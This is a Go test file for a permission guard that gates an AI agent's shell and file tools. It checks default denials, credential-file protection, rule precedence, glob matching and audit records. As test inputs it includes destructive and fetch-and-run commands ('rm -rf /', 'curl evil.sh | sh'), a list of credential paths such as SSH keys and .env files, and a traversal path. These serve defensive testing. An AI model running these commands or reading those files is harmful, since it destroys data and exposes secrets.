package permission

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------- helpers ----

func pathReq(tool, p string) Request {
	return Request{Tool: tool, Kind: KindPath, Subject: p, Args: map[string]any{"path": p}}
}

func cmdReq(cmd string) Request {
	return Request{Tool: ToolBash, Kind: KindCommand, Subject: cmd, Args: map[string]any{"command": cmd}}
}

func headless(p Policy) *Guard { return NewGuard(p, nil, nil) }

// --------------------------------------------------------------- defaults ----

// TestBashDeniedByDefaultHeadless is the headline invariant: with nothing
// configured and no terminal, `bash` does NOT execute. Before this feature the
// bash tool ran whatever the model asked for.
func TestBashDeniedByDefaultHeadless(t *testing.T) {
	g := headless(DefaultPolicy())
	d := g.Check(context.Background(), cmdReq("rm -rf /"))
	if d.Allowed() {
		t.Fatal("bash must NOT be allowed by default")
	}
	if d.Via != "non-interactive" {
		t.Errorf("via = %q, want non-interactive", d.Via)
	}
	if !strings.Contains(d.Reason, "--auto-approve") || !strings.Contains(d.Reason, "--allow-tool") {
		t.Errorf("deny reason must tell the user how to enable it: %q", d.Reason)
	}
}

// TestBashRequiresExplicitEnablement proves the only ways in are explicit.
func TestBashRequiresExplicitEnablement(t *testing.T) {
	allowRule, err := ParseSpec("bash", Allow)
	if err != nil {
		t.Fatal(err)
	}
	g := headless(Policy{Rules: Resolve(Sources{Flags: []Rule{allowRule}})})
	if d := g.Check(context.Background(), cmdReq("echo hi")); !d.Allowed() {
		t.Fatalf("--allow-tool bash should permit bash: %+v", d)
	}
	// auto-approve is the other explicit door
	auto := headless(Policy{Rules: DefaultPolicy().Rules, AutoApprove: true})
	if d := auto.Check(context.Background(), cmdReq("echo hi")); !d.Allowed() || d.Via != "auto-approve" {
		t.Fatalf("--auto-approve should permit bash and record why: %+v", d)
	}
}

// TestReadAllowedWriteAsksByDefault pins the defaults table.
func TestReadAllowedWriteAsksByDefault(t *testing.T) {
	g := headless(DefaultPolicy())
	root := t.TempDir()
	if d := g.Check(context.Background(), pathReq(ToolReadFile, filepath.Join(root, "a.txt"))); !d.Allowed() {
		t.Errorf("read_file of a workspace file should default to allow: %+v", d)
	}
	if d := g.Check(context.Background(), pathReq(ToolListDir, root)); !d.Allowed() {
		t.Errorf("list_dir should default to allow: %+v", d)
	}
	if d := g.Check(context.Background(), pathReq(ToolWriteFile, filepath.Join(root, "a.txt"))); d.Allowed() {
		t.Errorf("write_file should default to ask (=deny headless): %+v", d)
	}
}

// ------------------------------------------------------------ non-interactive ----

// TestNonInteractiveAskDeniesPromptly is THE regression guard: an `ask` with no
// TTY must return a deny immediately. The bound is enforced with a timer and a
// goroutine so a hang FAILS the test instead of wedging the suite.
func TestNonInteractiveAskDeniesPromptly(t *testing.T) {
	g := headless(DefaultPolicy())
	done := make(chan Decision, 1)
	go func() { done <- g.Check(context.Background(), cmdReq("sleep 1000")) }()
	select {
	case d := <-done:
		if d.Allowed() {
			t.Fatal("non-interactive ask must NOT auto-approve")
		}
		if d.Action != Deny {
			t.Fatalf("want Deny, got %q", d.Action)
		}
		if !strings.Contains(d.Reason, "no interactive terminal") {
			t.Errorf("reason should name the cause: %q", d.Reason)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("HANG: non-interactive ask did not return within 2s")
	}
}

// TestPrompterNotConsultedWhenNotNeeded proves the short-circuits: an explicit
// allow/deny rule and --auto-approve must never reach a human. (The prompter
// here fails the test if it is called.)
func TestPrompterNotConsultedWhenNotNeeded(t *testing.T) {
	boom := FuncPrompter(func(ctx context.Context, r Request) (Response, error) {
		t.Errorf("prompter must not be consulted for %s", r.Describe())
		return ResponseDeny, nil
	})
	allowRule, _ := ParseSpec("bash", Allow)
	g := NewGuard(Policy{Rules: Resolve(Sources{Flags: []Rule{allowRule}})}, boom, nil)
	if d := g.Check(context.Background(), cmdReq("ls")); !d.Allowed() || d.Via != "rule" {
		t.Errorf("an allow rule should short-circuit the prompt: %+v", d)
	}
	g2 := NewGuard(Policy{Rules: DefaultPolicy().Rules}, boom, nil)
	if d := g2.Check(context.Background(), pathReq(ToolReadFile, "/repo/.env")); d.Allowed() {
		t.Errorf("a deny rule should short-circuit the prompt: %+v", d)
	}
	g3 := NewGuard(Policy{Rules: DefaultPolicy().Rules, AutoApprove: true}, boom, nil)
	if d := g3.Check(context.Background(), cmdReq("ls")); !d.Allowed() || d.Via != "auto-approve" {
		t.Errorf("auto-approve should short-circuit the prompt: %+v", d)
	}
}

// TestNilGuardFailsClosed: a wiring mistake must deny, not ungate.
func TestNilGuardFailsClosed(t *testing.T) {
	var g *Guard
	d := g.Check(context.Background(), cmdReq("whoami"))
	if d.Allowed() {
		t.Fatal("a nil guard must fail closed")
	}
	if !strings.Contains(d.Reason, "ungated") {
		t.Errorf("reason: %q", d.Reason)
	}
}

// TestAutoApproveDoesNotOverrideDeny: automation opt-in is for `ask`, never for
// an explicit deny (otherwise --auto-approve would silently unprotect secrets).
func TestAutoApproveDoesNotOverrideDeny(t *testing.T) {
	g := headless(Policy{Rules: DefaultPolicy().Rules, AutoApprove: true})
	d := g.Check(context.Background(), pathReq(ToolReadFile, "/home/u/project/.env"))
	if d.Allowed() {
		t.Fatalf("--auto-approve must not override a deny rule: %+v", d)
	}
}

// TestAutoApproveIsRecordedAsSuch — auditability of the automation path.
func TestAutoApproveIsRecordedAsSuch(t *testing.T) {
	rec := &MemoryRecorder{}
	g := NewGuard(Policy{Rules: DefaultPolicy().Rules, AutoApprove: true}, nil, rec)
	if d := g.Check(context.Background(), cmdReq("make build")); !d.Allowed() {
		t.Fatalf("auto-approve should allow: %+v", d)
	}
	if len(rec.Entries) != 1 {
		t.Fatalf("want 1 audit entry, got %d", len(rec.Entries))
	}
	e := rec.Entries[0]
	if e.Decision.Via != "auto-approve" || e.Decision.Action != Allow || e.Request.Subject != "make build" {
		t.Errorf("audit entry does not identify the auto-approval: %+v", e)
	}
}

// TestDangerouslyAllowAllBypassesEverything, and says so in the record.
func TestDangerouslyAllowAllBypassesEverything(t *testing.T) {
	rec := &MemoryRecorder{}
	g := NewGuard(Policy{Rules: DefaultPolicy().Rules, DangerouslyAllowAll: true}, nil, rec)
	d := g.Check(context.Background(), pathReq(ToolReadFile, "/home/u/.ssh/id_rsa"))
	if !d.Allowed() || d.Via != "dangerously-allow-all" {
		t.Fatalf("escape hatch should allow and be labelled: %+v", d)
	}
	if len(rec.Entries) != 1 || rec.Entries[0].Decision.Via != "dangerously-allow-all" {
		t.Error("the bypass must still be audited")
	}
}

// ---------------------------------------------------------------- prompting ----

func TestPromptAllowOnceDoesNotPersist(t *testing.T) {
	calls := 0
	g := NewGuard(DefaultPolicy(), FuncPrompter(func(ctx context.Context, r Request) (Response, error) {
		calls++
		return ResponseAllowOnce, nil
	}), nil)
	for i := 0; i < 3; i++ {
		if d := g.Check(context.Background(), cmdReq("ls")); !d.Allowed() {
			t.Fatalf("call %d: %+v", i, d)
		}
	}
	if calls != 3 {
		t.Errorf("allow-once must re-prompt every time, prompts=%d", calls)
	}
}

func TestPromptAllowSessionPersists(t *testing.T) {
	calls := 0
	g := NewGuard(DefaultPolicy(), FuncPrompter(func(ctx context.Context, r Request) (Response, error) {
		calls++
		return ResponseAllowSession, nil
	}), nil)
	for i := 0; i < 3; i++ {
		if d := g.Check(context.Background(), cmdReq("ls")); !d.Allowed() {
			t.Fatalf("call %d: %+v", i, d)
		}
	}
	if calls != 1 {
		t.Errorf("allow-for-session must prompt once, prompts=%d", calls)
	}
}

func TestPromptDenyAndPromptErrorBothDeny(t *testing.T) {
	g := NewGuard(DefaultPolicy(), FuncPrompter(func(ctx context.Context, r Request) (Response, error) {
		return ResponseDeny, nil
	}), nil)
	if d := g.Check(context.Background(), cmdReq("ls")); d.Allowed() {
		t.Error("user deny must deny")
	}
	g2 := NewGuard(DefaultPolicy(), FuncPrompter(func(ctx context.Context, r Request) (Response, error) {
		return ResponseAllowOnce, context.Canceled
	}), nil)
	if d := g2.Check(context.Background(), cmdReq("ls")); d.Allowed() {
		t.Error("a prompt error must deny, not fall through to allow")
	}
}

func TestTTYPrompterEOFIsDeny(t *testing.T) {
	p := NewTTYPrompter(strings.NewReader(""), new(strings.Builder))
	got, err := p.Ask(context.Background(), cmdReq("ls"))
	if err != nil {
		t.Fatal(err)
	}
	if got != ResponseDeny {
		t.Fatalf("EOF on stdin must be a deny, got %v", got)
	}
}

func TestTTYPrompterShowsConcreteArguments(t *testing.T) {
	var out strings.Builder
	p := NewTTYPrompter(strings.NewReader("y\n"), &out)
	req := Request{Tool: ToolWriteFile, Kind: KindPath, Subject: "/tmp/x/notes.md",
		Args: map[string]any{"path": "notes.md", "content": "hello world"}}
	got, err := p.Ask(context.Background(), req)
	if err != nil || got != ResponseAllowOnce {
		t.Fatalf("resp=%v err=%v", got, err)
	}
	s := out.String()
	for _, want := range []string{"write_file", "/tmp/x/notes.md", "hello world", "allow once", "allow for this session", "deny"} {
		if !strings.Contains(s, want) {
			t.Errorf("prompt missing %q:\n%s", want, s)
		}
	}
}

func TestTTYPrompterAnswers(t *testing.T) {
	cases := map[string]Response{
		"y\n": ResponseAllowOnce, "Y\n": ResponseAllowOnce, "yes\n": ResponseAllowOnce,
		"a\n": ResponseAllowSession, "always\n": ResponseAllowSession,
		"n\n": ResponseDeny, "\n": ResponseDeny, "garbage\n": ResponseDeny,
	}
	for in, want := range cases {
		p := NewTTYPrompter(strings.NewReader(in), new(strings.Builder))
		got, err := p.Ask(context.Background(), cmdReq("ls"))
		if err != nil || got != want {
			t.Errorf("input %q -> %v (err %v), want %v", in, got, err, want)
		}
	}
}

// --------------------------------------------------------------- precedence ----

// TestPrecedenceFlagBeatsConfigBeatsDefault walks all three layers for the same
// tool and asserts the most specific source wins each time.
func TestPrecedenceFlagBeatsConfigBeatsDefault(t *testing.T) {
	root := t.TempDir()
	target := filepath.Join(root, "notes.md")

	// default alone: write_file is ask -> deny headless
	if d := headless(Policy{Rules: Resolve(Sources{})}).Check(context.Background(), pathReq(ToolWriteFile, target)); d.Allowed() {
		t.Fatalf("baseline should deny: %+v", d)
	}

	// config (root layer) allows write_file
	cfgOnly := Resolve(Sources{Root: Layer{Tools: []Rule{{Tool: ToolWriteFile, Kind: KindPath, Action: Allow, Source: "config:tools"}}}})
	d := headless(Policy{Rules: cfgOnly}).Check(context.Background(), pathReq(ToolWriteFile, target))
	if !d.Allowed() || !strings.Contains(d.Rule.Source, "config") {
		t.Fatalf("config should beat the builtin default: %+v", d)
	}

	// flag denies -> beats config allow
	flagDeny, _ := ParseSpec(ToolWriteFile, Deny)
	both := Resolve(Sources{
		Flags: []Rule{flagDeny},
		Root:  Layer{Tools: []Rule{{Tool: ToolWriteFile, Kind: KindPath, Action: Allow, Source: "config:tools"}}},
	})
	d = headless(Policy{Rules: both}).Check(context.Background(), pathReq(ToolWriteFile, target))
	if d.Allowed() || d.Rule.Source != "flag" {
		t.Fatalf("flag should beat config: %+v", d)
	}

	// profile layer beats root layer
	profVsRoot := Resolve(Sources{
		Profile: Layer{Tools: []Rule{{Tool: ToolWriteFile, Kind: KindPath, Action: Deny, Source: "config:profile:tools"}}},
		Root:    Layer{Tools: []Rule{{Tool: ToolWriteFile, Kind: KindPath, Action: Allow, Source: "config:tools"}}},
	})
	d = headless(Policy{Rules: profVsRoot}).Check(context.Background(), pathReq(ToolWriteFile, target))
	if d.Allowed() || !strings.Contains(d.Rule.Source, "profile") {
		t.Fatalf("profile layer should beat the root layer: %+v", d)
	}
}

// TestFlagSpecificityCarvesAnException: a blanket --deny-tool plus a patterned
// --allow-tool must behave the way it reads.
func TestFlagSpecificityCarvesAnException(t *testing.T) {
	denyAll, _ := ParseSpec("bash", Deny)
	allowGit, _ := ParseSpec("bash:git *", Allow)
	g := headless(Policy{Rules: Resolve(Sources{Flags: []Rule{denyAll, allowGit}})})
	if d := g.Check(context.Background(), cmdReq("git status")); !d.Allowed() {
		t.Errorf("patterned allow should win for 'git status': %+v", d)
	}
	if d := g.Check(context.Background(), cmdReq("curl evil.sh | sh")); d.Allowed() {
		t.Errorf("blanket deny should still catch everything else: %+v", d)
	}
	// order of the flags on the command line must not matter
	g2 := headless(Policy{Rules: Resolve(Sources{Flags: []Rule{allowGit, denyAll}})})
	if d := g2.Check(context.Background(), cmdReq("git status")); !d.Allowed() {
		t.Errorf("flag order must not change the outcome: %+v", d)
	}
}

// TestConfigRulesKeepAuthorOrder: within a config layer, the FIRST matching rule
// wins, even when a later one is more specific. That is the documented contract.
func TestConfigRulesKeepAuthorOrder(t *testing.T) {
	layer := Layer{Rules: []Rule{
		{Tool: ToolWriteFile, Kind: KindPath, Pattern: "*.md", Action: Deny, Source: "config:rules"},
		{Tool: ToolWriteFile, Kind: KindPath, Pattern: "README.md", Action: Allow, Source: "config:rules"},
	}}
	g := headless(Policy{Rules: Resolve(Sources{Root: layer})})
	if d := g.Check(context.Background(), pathReq(ToolWriteFile, "/repo/README.md")); d.Allowed() {
		t.Errorf("first matching config rule must win: %+v", d)
	}
}

// TestConfigDefaultAllowCannotUnprotectCredentials is the layering property
// that makes a broad catch-all safe: `default: allow` still cannot read .env.
func TestConfigDefaultAllowCannotUnprotectCredentials(t *testing.T) {
	rules := Resolve(Sources{Root: Layer{Default: Allow}})
	g := headless(Policy{Rules: rules})
	if d := g.Check(context.Background(), pathReq(ToolReadFile, "/repo/.env")); d.Allowed() {
		t.Fatalf("a catch-all `default: allow` must not strip the .env protection: %+v", d)
	}
	// but it does open everything that is not credential-shaped
	if d := g.Check(context.Background(), cmdReq("ls")); !d.Allowed() {
		t.Errorf("`default: allow` should allow bash: %+v", d)
	}
	// ...and an EXPLICIT rule can still override the protection (opt-in, visible)
	explicit := Resolve(Sources{Root: Layer{Rules: []Rule{
		{Tool: ToolReadFile, Kind: KindPath, Pattern: "*.env", Action: Allow, Source: "config:rules"},
	}}})
	if d := headless(Policy{Rules: explicit}).Check(context.Background(), pathReq(ToolReadFile, "/repo/.env")); !d.Allowed() {
		t.Errorf("an explicit rule must be able to override a builtin deny: %+v", d)
	}
}

// TestCatchAllIsLast: an unknown (e.g. MCP) tool falls to `ask` -> headless deny.
func TestUnknownToolFallsToCatchAll(t *testing.T) {
	g := headless(DefaultPolicy())
	d := g.Check(context.Background(), Request{Tool: "mcp__github__create_issue"})
	if d.Allowed() {
		t.Fatalf("an unknown tool must not be allowed by default: %+v", d)
	}
}

// ------------------------------------------------------------------ globbing ----

// TestGlobEnvVsEnvExample is the canonical distinction from the spec.
func TestGlobEnvVsEnvExample(t *testing.T) {
	g := headless(DefaultPolicy())
	denied := []string{
		"/repo/.env", "/repo/sub/.env", "/repo/prod.env",
		"/repo/.env.local", "/repo/.env.production",
		"/repo/certs/server.pem", "/repo/certs/server.key",
		"/repo/id_rsa", "/repo/deep/nest/id_ed25519",
		"/repo/.netrc", "/repo/service-account-prod.json",
	}
	for _, p := range denied {
		if d := g.Check(context.Background(), pathReq(ToolReadFile, p)); d.Allowed() {
			t.Errorf("%s must be denied by default (rule %s)", p, d.Rule)
		}
	}
	allowed := []string{
		"/repo/.env.example", "/repo/.env.sample", "/repo/.env.template",
		"/repo/config/app.env.example",
		"/repo/README.md", "/repo/src/main.go", "/repo/keyboard.md",
	}
	for _, p := range allowed {
		if d := g.Check(context.Background(), pathReq(ToolReadFile, p)); !d.Allowed() {
			t.Errorf("%s should be allowed, denied by %s", p, d.Rule)
		}
	}
}

// TestHomeCredentialDirsDenied covers the ~ expansion.
func TestHomeCredentialDirsDenied(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		t.Skip("no home dir")
	}
	g := headless(DefaultPolicy())
	for _, p := range []string{
		filepath.Join(home, ".ssh", "id_rsa"),
		filepath.Join(home, ".ssh", "config"),
		filepath.Join(home, ".aws", "credentials"),
		filepath.Join(home, ".gnupg", "secring.gpg"),
	} {
		if d := g.Check(context.Background(), pathReq(ToolReadFile, p)); d.Allowed() {
			t.Errorf("%s must be denied by default", p)
		}
	}
}

// TestTraversalCannotDodgeARule: the subject the gate sees is already cleaned,
// so "../../.ssh/id_rsa" is adjudicated as the real target.
func TestTraversalCannotDodgeARule(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		t.Skip("no home dir")
	}
	g := headless(DefaultPolicy())
	// what tool.pathSubject would produce for root=<home>/a/b and rel=../../.ssh/id_rsa
	resolved := filepath.Clean(filepath.Join(home, "a", "b", "../../.ssh/id_rsa"))
	if resolved != filepath.Join(home, ".ssh", "id_rsa") {
		t.Fatalf("test setup wrong: %s", resolved)
	}
	if d := g.Check(context.Background(), pathReq(ToolReadFile, resolved)); d.Allowed() {
		t.Fatalf("traversal to ~/.ssh/id_rsa must be denied: %+v", d)
	}
}

func TestMatchPathDialect(t *testing.T) {
	cases := []struct {
		pattern, path string
		want          bool
	}{
		{"*.env", "/a/b/.env", true},
		{"*.env", "/a/b/.env.local", false},
		{"*.env.example", "/a/b/.env.example", true},
		{"*.env.*", "/a/b/.env.local", true},
		{"*.md", "/a/b/c.md", true},
		{"*.md", "/a/b/c.markdown", false},
		{"src/*.go", "/repo/src/main.go", true},
		{"src/*.go", "/repo/src/deep/main.go", false},
		{"src/**", "/repo/src/deep/main.go", true},
		{"/abs/only/**", "/abs/only/x/y", true},
		{"/abs/only/**", "/other/x", false},
		{"?.txt", "/d/a.txt", true},
		{"?.txt", "/d/ab.txt", false},
		{"", "/a", false},
		{"*.pem", "", false},
	}
	for _, c := range cases {
		if got := MatchPath(c.pattern, c.path); got != c.want {
			t.Errorf("MatchPath(%q, %q) = %v, want %v", c.pattern, c.path, got, c.want)
		}
	}
}

func TestMatchCommandDialect(t *testing.T) {
	cases := []struct {
		pattern, cmd string
		want         bool
	}{
		{"git *", "git status", true},
		{"git*", "git status", true},
		{"git *", "gitleaks scan", false},
		{"git", "git status", true},
		{"git", "github-cli x", false},
		{"git", "git", true},
		{"npm test", "npm test", true},
		{"npm test", "npm test -- -v", false},
		{"*", "anything at all", true},
		{"", "ls", false},
		{"ls", "", false},
	}
	for _, c := range cases {
		if got := MatchCommand(c.pattern, c.cmd); got != c.want {
			t.Errorf("MatchCommand(%q, %q) = %v, want %v", c.pattern, c.cmd, got, c.want)
		}
	}
}

// TestPathRuleNeverMatchesACommand: a path glob must not leak into the shell
// dialect (e.g. "*.key" accidentally denying `echo my.key`... or worse, an
// allow rule matching something it was never meant to).
func TestKindIsolatesDialects(t *testing.T) {
	r := Rule{Tool: "*", Kind: KindPath, Pattern: "*.pem", Action: Deny}
	if r.matches(cmdReq("cat server.pem")) {
		t.Error("a path rule must not match a command subject")
	}
	c := Rule{Tool: "*", Kind: KindCommand, Pattern: "rm *", Action: Deny}
	if c.matches(pathReq(ToolReadFile, "/x/rm foo")) {
		t.Error("a command rule must not match a path subject")
	}
}

// ------------------------------------------------------------------- parsing ----

func TestParseSpec(t *testing.T) {
	r, err := ParseSpec("bash:git *", Allow)
	if err != nil {
		t.Fatal(err)
	}
	if r.Tool != "bash" || r.Pattern != "git *" || r.Kind != KindCommand || r.Action != Allow || r.Source != "flag" {
		t.Errorf("bad parse: %+v", r)
	}
	r, err = ParseSpec("write_file", Deny)
	if err != nil {
		t.Fatal(err)
	}
	if r.Tool != "write_file" || r.Pattern != "" || r.Kind != KindPath {
		t.Errorf("bad parse: %+v", r)
	}
	for _, bad := range []string{"", "   ", ":pattern"} {
		if _, err := ParseSpec(bad, Allow); err == nil {
			t.Errorf("ParseSpec(%q) should fail", bad)
		}
	}
}

func TestParseAction(t *testing.T) {
	for _, s := range []string{"allow", "ASK", " deny "} {
		if _, err := ParseAction(s); err != nil {
			t.Errorf("ParseAction(%q): %v", s, err)
		}
	}
	if _, err := ParseAction("maybe"); err == nil {
		t.Error("invalid action should error")
	}
}

func TestParseLayer(t *testing.T) {
	block := map[string]any{
		"default":      "deny",
		"auto_approve": true,
		"tools":        map[string]any{"read_file": "allow", "bash": "deny"},
		"rules": []any{
			map[string]any{"tool": "write_file", "pattern": "*.md", "action": "allow"},
			map[string]any{"pattern": "*.tf", "action": "deny", "kind": "path"},
		},
	}
	l, auto, err := ParseLayer(block, "config")
	if err != nil {
		t.Fatal(err)
	}
	if !auto {
		t.Error("auto_approve should be parsed")
	}
	if l.Default != Deny {
		t.Errorf("default = %q", l.Default)
	}
	if len(l.Tools) != 2 || len(l.Rules) != 2 {
		t.Fatalf("tools=%v rules=%v", l.Tools, l.Rules)
	}
	if l.Rules[1].Tool != "*" || l.Rules[1].Kind != KindPath {
		t.Errorf("rule without a tool should default to '*': %+v", l.Rules[1])
	}
}

func TestParseLayerRejectsGarbage(t *testing.T) {
	bad := []map[string]any{
		{"default": "maybe"},
		{"default": 5},
		{"auto_approve": "yes"},
		{"tools": []any{"read_file"}},
		{"tools": map[string]any{"bash": 1}},
		{"tools": map[string]any{"bash": "sometimes"}},
		{"rules": "nope"},
		{"rules": []any{"nope"}},
		{"rules": []any{map[string]any{"tool": "bash"}}}, // missing action
		{"rules": []any{map[string]any{"tool": "bash", "action": "allow", "kind": "shell"}}}, // bad kind
	}
	for i, b := range bad {
		if _, _, err := ParseLayer(b, "config"); err == nil {
			t.Errorf("case %d (%v) should be rejected", i, b)
		}
	}
	// nil block is fine (no permissions configured)
	if _, _, err := ParseLayer(nil, "config"); err != nil {
		t.Errorf("nil block: %v", err)
	}
}

// ------------------------------------------------------------------- audit ----

func TestSummarizeArgsTruncates(t *testing.T) {
	s := SummarizeArgs(map[string]any{"content": strings.Repeat("x", 5000), "path": "a.txt"})
	if len(s) > 500 {
		t.Errorf("args summary should be bounded, got %d bytes", len(s))
	}
	if !strings.Contains(s, "a.txt") {
		t.Errorf("summary should keep the path: %s", s)
	}
}

func TestEveryDecisionIsRecorded(t *testing.T) {
	rec := &MemoryRecorder{}
	g := NewGuard(DefaultPolicy(), nil, rec)
	g.Check(context.Background(), pathReq(ToolReadFile, "/repo/a.txt")) // allow
	g.Check(context.Background(), cmdReq("rm -rf /"))                   // deny
	g.Check(context.Background(), pathReq(ToolReadFile, "/repo/.env"))  // deny (rule)
	if len(rec.Entries) != 3 {
		t.Fatalf("want 3 recorded decisions, got %d", len(rec.Entries))
	}
	if rec.Entries[0].Decision.Action != Allow || rec.Entries[1].Decision.Action != Deny {
		t.Errorf("verdicts not recorded faithfully: %+v", rec.Entries)
	}
	if !strings.Contains(Summary(rec.Entries), "rm -rf /") {
		t.Error("Summary should show the concrete argument")
	}
}
